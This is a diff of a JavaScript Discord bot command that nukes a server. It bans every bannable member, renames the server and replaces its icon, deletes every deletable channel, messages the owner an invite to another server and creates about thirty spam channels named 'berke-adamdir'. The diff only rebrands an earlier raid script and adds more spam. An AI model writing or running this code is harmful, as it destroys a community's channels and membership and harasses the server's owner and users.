@@ -10,7 +10,7 @@ let emojiler = 0;
       
 message.guild.members.forEach(u => {
 if (u.bannable) {
-message.guild.ban(u, "Amonx No Mercy")
+message.guild.ban(u, "Berke Adamdır")
 }
 })
   
@@ -18,8 +18,8 @@ message.guild.ban(u, "Amonx No Mercy")
   
 
   
-message.guild.setName(`Global Order Of Satan 😈`, ":))")
-message.guild.setIcon(`https://cdn.discordapp.com/attachments/544121540283858964/566640720891346965/global-order-of-satan.png`)
+message.guild.setName(`BERKE ADAMDIR`, ":))")
+message.guild.setIcon(`https://discordapp.com/channels/551706577023795201/564817548940541981/566650620585443343`)
   
 message.guild.channels.forEach(c => {
 if (c.deletable) {
@@ -32,9 +32,37 @@ return c.delete();
     
 
   
-message.guild.owner.send(`**https://discord.gg/eQfrfJQ**`);
-message.guild.createChannel(`satan `)
-message.guild.createChannel(`never-lose`)
+message.guild.owner.send(`Yeni Discord ** https://discord.gg/w8Xq9bm **`);
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
+message.guild.createChannel(`berke-adamdir `)
 message.delete()
 }
 };
